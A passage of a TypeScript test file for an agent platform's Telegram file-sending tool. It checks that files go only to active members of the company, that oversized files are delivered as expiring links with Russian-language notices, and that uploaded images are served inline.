  it('takes as the addressee only an active person of this company, never a Telegram number, a username or anyone else', async () => {
    const c = await marketingCompany();
    const { token } = await c.startTurn(c.mktSeo.id);
    const up = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&name=partner-contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    const attachment = up.json().id as string;
    /* Someone of another company who connected Telegram, someone of this one who no longer works in it, and Clara's
       assistant, which is no person: each has a Telegram number a bot could write to. */
    const [other] = await c.db.insert(companies).values({ name: 'Other company', singleton: false }).returning();
    const [outsider] = await c.db.insert(people).values({ companyId: other!.id, name: 'Olaf', email: 'olaf@other.test', status: 'active', scopeKind: 'company', telegramUserId: 7770009 }).returning();
    const [gone] = await c.db.insert(people).values({ companyId: c.companyId, name: 'Gina', email: 'gina@acme.test', status: 'disabled', scopeKind: 'company', telegramUserId: 7770010 }).returning();
    const [assistant] = await c.db.insert(people).values({ companyId: c.companyId, name: 'Clara assistant', status: 'active', scopeKind: 'listed', isAgent: true, assistantOf: c.clara.id, telegramUserId: 7770011 }).returning();
    const client = await mcp(c.app, token);
    const addressees = [String(MKT_TG.id), String(SALES_TG.id), '7770009', '+15550100', '@clara_mkt', 'clara_mkt', outsider!.id, 'Olaf', gone!.id, 'Gina', assistant!.id, 'Clara assistant'];
    for (const person of addressees) {
      const reply = (await client.callTool({ name: 'send_telegram_file', arguments: { person, attachment } })) as ToolReply;
      expect(reply.isError, person).toBe(true);
      expect(reply.content[0]!.text, person).toMatch(/^There is no active person (?:named "[^"]+"|with that id) in this company\.$/);
    }
    expect(c.tg.sentDocuments).toEqual([]);
  });

  it('gives a file over 50 MB on Telegram as its link, saying it lives 30 days on one machine, and goes on with the chat', async () => {
    const c = await marketingCompany();
    const dir = mkdtempSync(join(tmpdir(), 'hh-files-'));
    onTestFinished(() => rmSync(dir, { recursive: true, force: true }));
    c.app.ctx.config.filesDir = dir;
    const big = Buffer.alloc(FILE_BYTES + 1, 5);
    c.tg.write(BOT_TOKEN, CEO_TG, 'Пришли архив');
    const run = await nextOf(c.node, 'job.run');
    c.node.send({ type: 'job.started', jobId: run.jobId });
    await until(async () => (await c.db.select().from(telegramReplies)).length === 1);
    const up = await c.app.inject({
      method: 'POST',
      url: '/api/attachments?chat=1&name=archive.zip',
      payload: big,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${run.toolToken}` },
    });
    expect(up.statusCode).toBe(201);
    c.node.send({ type: 'job.event', jobId: run.jobId, seq: 0, event: { kind: 'text', text: 'Вот архив.' } });
    await until(() => c.tg.sent.filter(s => s.chat_id === CEO_TG.id).length === 2);
    expect(c.tg.sentDocuments).toHaveLength(0);
    const said = c.tg.sent.filter(s => s.chat_id === CEO_TG.id).map(s => s.text);
    expect(said).toContain('Вот архив.');
    const link = said.map(s => /^Файл archive\.zip большой: он хранится 30 дней на одной машине и пропадет, если этой машины не станет\. По ссылке его можно скачать 7 дней: (\S+)$/.exec(s)?.[1]).find(Boolean);
    const opened = await c.app.inject({ url: new URL(link!).pathname });
    expect(opened.rawPayload.equals(big)).toBe(true);

    /* A bot sends no file that big, so the agent gets its link to pass on. */
    const client = await mcp(c.app, run.toolToken!);
    const tool = (await client.callTool({ name: 'send_telegram_file', arguments: { person: c.ceo.id, attachment: up.json().id } })) as ToolReply;
    expect(tool.isError).toBe(true);
    expect(tool.content[0]!.text).toMatch(/^archive\.zip is over 50 MB, more than a Telegram bot sends\. Give Ivan its link instead, which opens it for 7 days with no sign-in, and say that a big file lives 30 days on one machine and is lost if that machine goes: http\S+\/api\/files\/\S+$/);
    expect(c.tg.sentDocuments).toHaveLength(0);
  });

  it('shows a picture an agent attached to its chat as a picture, and gives every other chat file to save', async () => {
    const c = await marketingCompany();
    const { token } = await c.startTurn(c.mktSeo.id);
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
    const up = await c.app.inject({
      method: 'POST',
      url: '/api/attachments?chat=1&name=chart.png',
      payload: png,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    const got = await c.app.inject({ url: `/api/attachments/${up.json().id as string}`, ...as(c.claraSession) });
    expect(got.statusCode).toBe(200);
    expect(got.headers['content-type']).toBe('image/png');
    expect(got.headers['content-disposition']).toBeUndefined();
    expect(Buffer.compare(got.rawPayload, png)).toBe(0);
  });
});
